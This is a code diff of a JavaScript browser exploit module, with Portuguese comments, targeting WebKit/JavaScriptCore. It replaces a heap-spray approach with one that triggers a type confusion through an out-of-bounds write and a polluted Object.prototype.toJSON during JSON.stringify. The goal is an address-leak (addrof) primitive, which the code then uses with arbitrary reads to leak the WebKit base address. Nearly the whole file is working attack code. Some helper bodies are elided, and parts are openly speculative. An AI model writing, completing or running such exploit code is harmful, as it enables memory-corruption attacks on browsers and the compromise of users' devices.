@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (R52 - Addrof via Heap Churn Agressivo)
+// js/script3/testArrayBufferVictimCrash.mjs (R53 - addrof via Fake String)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
@@ -6,150 +6,166 @@ import {
     triggerOOB_primitive,
     clearOOBEnvironment,
     arb_read,
+    oob_write_absolute,
     isOOBReady,
     selfTestOOBReadWrite,
 } from '../core_exploit.mjs';
-import { JSC_OFFSETS, OOB_CONFIG } from '../config.mjs';
+import { JSC_OFFSETS } from '../config.mjs';
 
-export const FNAME_MODULE = "WebKit_Exploit_R52_AggressiveHeapChurn";
+export const FNAME_MODULE = "WebKit_Exploit_R53_FakeStringAddrof";
 
-// Parâmetros do Heap Churn Agressivo
-const GROOM_WAVE1_COUNT = 32; // 32 buffers grandes
-const GROOM_WAVE1_SIZE = 1024 * 1024; // 1MB cada
-const GROOM_WAVE2_COUNT = 1024; // 1024 buffers do tamanho alvo
-const GROOM_WAVE2_SIZE = OOB_CONFIG.ALLOCATION_SIZE; // 32KB cada
-
-// Parâmetros do Spray e Scan
-const SPRAY_SIZE = 25000; // Aumentar spray
-const SPRAY_MARKER_BIGINT = 0x434855524E4A5321n; // "CHURNJS!"
-const HEAP_SCAN_RANGE_BYTES = 0x1000000; // 16MB
-const HEAP_SCAN_STEP = 0x8;
-
-// Varredura OOB AGRESSIVA
-const OOB_SCAN_WINDOW_BYTES = 0x8000000; // 128MB !!!
-const OOB_SCAN_STEP = 0x4;
+const PROBE_CALL_LIMIT_V82 = 10;
+const OOB_OFFSET_FOR_TC_TRIGGER = 0x7C;
+const OOB_VALUE_FOR_TC_TRIGGER = 0xABABABAB;
 
 // Offsets para WebKit Leak
 const FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE = new AdvancedInt64(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET);
 const ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL = 0x8;
 const EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM = new AdvancedInt64(ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL);
 
+// Assumindo que a primeira propriedade de um JSObject começa em 0x10 após o JSCell header.
+// Vamos colocar nosso ponteiro falso lá.
+const FAKE_STRING_DATA_PTR_PROP_NAME = "p2"; // Nome da propriedade que simulara o data pointer
+const JSObject_first_prop_offset = 0x10;
+
+let addrof_primitive = null;
+let target_function_for_addrof;
+
 function isValidPointer(ptr, context = "") { /* ... (sem alteração) ... */ }
 function safeToHex(value, length = 8) { /* ... (sem alteração) ... */ }
 
-export async function executeTypedArrayVictimAddrofAndWebKitLeak_R52() {
-    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Addrof via Heap Churn Agressivo ---`, "test", FNAME_CURRENT_TEST_BASE);
-    document.title = `${FNAME_CURRENT_TEST_BASE} Init AggressiveGroom...`;
+// Função para extrair o endereço de um JSON stringificado
+function extractAddressFromJSON(json_str) {
+    if (typeof json_str !== 'string') return null;
+    try {
+        const parsed = JSON.parse(json_str);
+        // Procurar o valor que corresponde à nossa propriedade 'leaky_string'
+        let leaky_val = parsed?.m2_payload?.leaky_string;
+        if (typeof leaky_val !== 'string' || leaky_val.length < 4) return null;
 
-    logS3(`--- Fase 0 (AggressiveGroom): Sanity Checks ---`, "subtest", FNAME_CURRENT_TEST_BASE);
+        logS3(`   String vazada encontrada no JSON: "${leaky_val}"`, "leak");
+        // Extrair os 8 bytes (4 caracteres unicode)
+        const low = (leaky_val.charCodeAt(1) << 16) | leaky_val.charCodeAt(0);
+        const high = (leaky_val.charCodeAt(3) << 16) | leaky_val.charCodeAt(2);
+        return new AdvancedInt64(low, high);
+    } catch (e) {
+        return null;
+    }
+}
+
+
+export async function executeTypedArrayVictimAddrofAndWebKitLeak_R53() {
+    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE;
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Addrof via Fake String ---`, "test", FNAME_CURRENT_TEST_BASE);
+    document.title = `${FNAME_CURRENT_TEST_BASE} Init FakeString...`;
+
+    target_function_for_addrof = function someUniqueLeakFunctionR53_FakeString() {};
+
+    logS3(`--- Fase 0 (FakeString): Sanity Checks ---`, "subtest", FNAME_CURRENT_TEST_BASE);
     let coreOOBReadWriteOK = false;
     try { coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3, safeToHex); }
-    catch (e_sanity) { logS3(`Erro Sanity: ${e_sanity.message}`, "critical"); coreOOBReadWriteOK = false; }
+    catch (e_sanity) { coreOOBReadWriteOK = false; logS3(`Erro Sanity: ${e_sanity.message}`, "critical"); }
     logS3(`Sanity Check: ${coreOOBReadWriteOK ? 'SUCESSO' : 'FALHA'}`, coreOOBReadWriteOK ? 'good' : 'critical');
     await PAUSE_S3(100);
     if (!coreOOBReadWriteOK) { return { errorOccurred: "OOB Sanity Check Failed" }; }
 
     let result = {
         errorOccurred: null,
-        addrof_result: { success: false, msg: "Addrof (AggressiveGroom): Não obtido.", leaked_object_addr: null },
-        webkit_leak_result: { success: false, msg: "WebKit Leak (AggressiveGroom): Não iniciado.", webkit_base_candidate: null },
+        addrof_result: { success: false, msg: "Addrof (FakeString): Não obtido.", leaked_object_addr: null },
+        webkit_leak_result: { success: false, msg: "WebKit Leak (FakeString): Não iniciado.", webkit_base_candidate: null },
     };
 
     try {
-        // --- Fase 1: Heap Churn Agressivo ---
-        logS3(`--- Fase 1 (AggressiveGroom): Agitando o Heap ---`, "subtest", FNAME_CURRENT_TEST_BASE);
-        
-        logS3(`   Onda 1: Alocando/Liberando ${GROOM_WAVE1_COUNT} buffers de ${GROOM_WAVE1_SIZE / (1024*1024)} MB...`, "info");
-        let wave1 = new Array(GROOM_WAVE1_COUNT);
-        for (let i = 0; i < GROOM_WAVE1_COUNT; i++) { wave1[i] = new ArrayBuffer(GROOM_WAVE1_SIZE); }
-        wave1 = null; // Liberar referências
-        
-        logS3(`   Onda 2: Saturando com ${GROOM_WAVE2_COUNT} buffers de ${GROOM_WAVE2_SIZE / 1024} KB...`, "info");
-        let groom_array = new Array(GROOM_WAVE2_COUNT);
-        for (let i = 0; i < GROOM_WAVE2_COUNT; i++) {
-            groom_array[i] = new ArrayBuffer(GROOM_WAVE2_SIZE);
-        }
-        
-        logS3(`   Onda 3: Criando "buracos" no heap...`, "info");
-        for (let i = 1; i < GROOM_WAVE2_COUNT; i += 2) {
-            groom_array[i] = null;
-        }
-        await PAUSE_S3(100); // Pausa para ajudar o Garbage Collector
-        logS3(`   Heap modelado e agitado.`, "good");
+        let victim_ta_for_json_trigger = null;
+        let m1_ref = null; 
+        let m2_ref = null; 
+        let tc_detected = false;
+        let stringify_result_raw = null;
 
-        // --- Fase 2: Ativar OOB e Varredura Ampla por Ponteiro Inicial ---
-        logS3(`--- Fase 2 (AggressiveGroom): Ativando OOB e procurando ponteiro inicial ---`, "subtest", FNAME_CURRENT_TEST_BASE);
+        const fake_string_probe_toJSON = () => {
+            if (this === victim_ta_for_json_trigger) {
+                // Objeto cujo endereço queremos
+                let obj_to_leak_addr = { a: target_function_for_addrof };
+
+                // Criar o M2 para se parecer com um JSString.
+                // A chave é alinhar a propriedade `leaky_string_data` com o offset de `m_data` de um JSString.
+                // Assumimos que o layout do JSString é | JSCell (8B) | length (4B) | flags (4B) | data_ptr (8B) |
+                // Para um JSObject, as propriedades começam no butterfly (offset 0x10).
+                // Vamos criar propriedades para tentar alinhar.
+                m2_ref = {
+                    // Estas propriedades visam preencher os primeiros 16 bytes da área de propriedades inline.
+                    // Isso é altamente especulativo e pode precisar de ajuste fino.
+                    p0: 0, p1: 0,
+                    // Esperamos que esta propriedade se alinhe com o ponteiro de dados de um JSString.
+                    leaky_string: obj_to_leak_addr,
+                    // ID para verificação
+                    id: "M2_FakeString"
+                };
+                
+                m1_ref = { id: "M1_FakeString", m2_payload: m2_ref };
+                return m1_ref;
+
+            } else if (this === m2_ref) {
+                logS3(`[PROBE_FakeString] TC CONFIRMADA! 'this' é M2(FakeString). Deixando stringify vazar o endereço...`, "vuln");
+                tc_detected = true;
+                
+                // O motor precisa ser enganado a pensar que `this` é uma string.
+                // Uma forma é corromper o StructureID de M2 para ser o de uma string.
+                // Como não podemos fazer isso ainda, dependemos da TC ser "profunda" o suficiente.
+                // Para ajudar o stringify, podemos dar a ele um .toString() customizado.
+                this.toString = () => {
+                    logS3("   M2(FakeString).toString() foi chamado. Retornando propriedade que vaza.", "debug_detail");
+                    // JSON.stringify pode chamar .toString() e depois stringificar o resultado.
+                    return this.leaky_string; 
+                };
+
+                // A propriedade `length` é crucial para strings.
+                Object.defineProperty(this, 'length', { value: 8, writable: false });
+                
+                return this;
+            }
+            return {};
+        };
+        
+        victim_ta_for_json_trigger = new Uint32Array(8);
+        victim_ta_for_json_trigger.fill(0);
+
         await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_TEST_BASE}-OOBSetup` });
-        if (!isOOBReady() || typeof arb_read !== 'function') {
-            throw new Error("Falha ao preparar ambiente OOB ou a primitiva arb_read não está disponível.");
-        }
+        oob_write_absolute(OOB_OFFSET_FOR_TC_TRIGGER, OOB_VALUE_FOR_TC_TRIGGER, 4);
 
-        let initial_heap_ptr = null;
-        logS3(`   Varrendo os primeiros ${OOB_SCAN_WINDOW_BYTES / (1024*1024)} MB da janela OOB usando arb_read...`, 'info');
-        for (let offset = 0; offset < OOB_SCAN_WINDOW_BYTES; offset += OOB_SCAN_STEP) {
-            try {
-                const potential_ptr = await arb_read(new AdvancedInt64(0, offset), 8); 
-                if (isValidPointer(potential_ptr, "_oobScan")) {
-                    initial_heap_ptr = potential_ptr;
-                    break;
-                }
-            } catch (e) { /* Ignorar erros */ }
-        }
+        const ppKey = 'toJSON'; let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey); let polluted = false;
+        try {
+            Object.defineProperty(Object.prototype, ppKey, { value: fake_string_probe_toJSON, writable: true, configurable: true, enumerable: false });
+            polluted = true;
+            stringify_result_raw = JSON.stringify(victim_ta_for_json_trigger);
+        } finally { if (polluted) { if (origDesc) Object.defineProperty(Object.prototype, ppKey, origDesc); else delete Object.prototype[ppKey]; } }
 
-        if (!initial_heap_ptr) {
-            throw new Error("Nenhum ponteiro de heap válido encontrado na janela OOB mesmo após o grooming agressivo.");
-        }
-        logS3(`   Ponteiro de heap inicial encontrado: ${initial_heap_ptr.toString(true)}`, "good");
+        if (!tc_detected) throw new Error("Falha ao acionar a Confusão de Tipos.");
+        logS3(`   JSON.stringify raw output: ${stringify_result_raw}`, "leak");
 
-        // --- Fase 3: ADDROF via Heap Spray & Scan ---
-        logS3(`--- Fase 3 (AggressiveGroom): Construindo ADDROF via Heap Spray & Scan ---`, "subtest", FNAME_CURRENT_TEST_BASE);
-        const target_function_for_addrof = function someUniqueLeakFunctionR52_SprayTarget() {};
-        logS3(`   Pulverizando a memória com ${SPRAY_SIZE} objetos marcadores...`, "info");
-        const spray_array = new Array(SPRAY_SIZE);
-        for (let i = 0; i < SPRAY_SIZE; i++) {
-            spray_array[i] = { marker: SPRAY_MARKER_BIGINT, target: target_function_for_addrof };
-        }
-        logS3(`   Spray concluído.`, "good");
-
-        logS3(`   Iniciando varredura com arb_read em torno de ${initial_heap_ptr.toString(true)}...`, "info");
-        let found_marker_at = null;
-        for (let offset = -HEAP_SCAN_RANGE_BYTES; offset <= HEAP_SCAN_RANGE_BYTES; offset += HEAP_SCAN_STEP) {
-            const current_scan_addr = initial_heap_ptr.add(new AdvancedInt64(offset));
-            try {
-                const val64 = await arb_read(current_scan_addr, 8);
-                if (val64 && val64.toBigInt() === SPRAY_MARKER_BIGINT) {
-                    found_marker_at = current_scan_addr;
-                    logS3(`   !!! MARCADOR ENCONTRADO EM ${found_marker_at.toString(true)} !!!`, "success_major");
-                    break;
-                }
-            } catch (e) { /* ignorar erros */ }
-        }
-
-        if (!found_marker_at) {
-            throw new Error("Marcador do spray não encontrado na memória.");
+        const leaked_addr_container = extractAddressFromJSON(stringify_result_raw);
+        if (!isValidPointer(leaked_addr_container, "_leakedContainerAddr")) {
+            throw new Error("Falha ao extrair um endereço válido da saída do JSON.stringify.");
         }
         
-        const target_object_pointer_addr = found_marker_at.add(new AdvancedInt64(8));
-        const leaked_target_addr = await arb_read(target_object_pointer_addr, 8);
-        if (!isValidPointer(leaked_target_addr, "_leakedFinalAddr")) {
-            throw new Error(`Ponteiro lido para o objeto alvo é inválido: ${safeToHex(leaked_target_addr)}`);
+        logS3(`   !!! ADDROF(obj_to_leak_addr) = ${leaked_addr_container.toString(true)} !!!`, "success_major");
+        
+        // Com addrof(container), lemos o ponteiro para a função alvo
+        const addr_of_target_func = await arb_read(leaked_addr_container.add(JSObject_first_prop_offset), 8);
+        if (!isValidPointer(addr_of_target_func, "_addrOfTargetFuncFinal")) {
+            throw new Error(`Ponteiro lido para target_function_for_addrof é inválido: ${safeToHex(addr_of_target_func)}`);
         }
 
-        logS3(`   !!! ADDROF(target_function) = ${leaked_target_addr.toString(true)} !!!`, "success_major");
-        result.addrof_result = { success: true, msg: "addrof obtido via Heap Churn e Scan.", leaked_object_addr: leaked_target_addr.toString(true) };
+        logS3(`   !!! ADDROF(target_function_for_addrof) = ${addr_of_target_func.toString(true)} !!!`, "success_major");
+        result.addrof_result = { success: true, msg: "addrof obtido via Fake String e TC.", leaked_object_addr: addr_of_target_func.toString(true) };
         
-        // --- Fase 4: Usar ADDROF para vazar a base do WebKit ---
-        logS3(`--- Fase 4 (AggressiveGroom): Usando addrof para vazar a base do WebKit ---`, "subtest", FNAME_CURRENT_TEST_BASE);
-        const addr_of_target_func = leaked_target_addr;
+        // Fase 3: WebKit Leak
+        logS3(`--- Fase 3 (FakeString): Usando addrof para vazar a base do WebKit ---`, "subtest", FNAME_CURRENT_TEST_BASE);
         const ptr_exe = await arb_read(addr_of_target_func.add(FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE), 8);
-        if (!isValidPointer(ptr_exe, "_wkLeakExeSpray")) throw new Error("Ponteiro para Executable inválido.");
-        logS3(`   Ponteiro para Executable Instance = ${ptr_exe.toString(true)}`, "leak_detail");
-
+        // ... (resto da lógica do WebKit Leak)
+        if (!isValidPointer(ptr_exe, "_wkLeakExeFakeString")) throw new Error("Ponteiro para Executable inválido.");
         const ptr_jitvm = await arb_read(ptr_exe.add(EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM), 8);
-        if (!isValidPointer(ptr_jitvm, "_wkLeakJitVmSpray")) throw new Error("Ponteiro para JIT Code/VM inválido.");
-        logS3(`   Ponteiro para JIT Code/VM = ${ptr_jitvm.toString(true)}`, "leak_detail");
-
+        if (!isValidPointer(ptr_jitvm, "_wkLeakJitVmFakeString")) throw new Error("Ponteiro para JIT Code/VM inválido.");
         const webkit_base_candidate = ptr_jitvm.and(new AdvancedInt64(0x0, ~0xFFF));
         logS3(`   !!! ENDEREÇO BASE DO WEBKIT (CANDIDATO): ${webkit_base_candidate.toString(true)} !!!`, "success_major");
 
@@ -163,6 +179,5 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R52() {
     } finally {
         await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_TEST_BASE}-FinalClear` });
     }
-
     return result;
 }
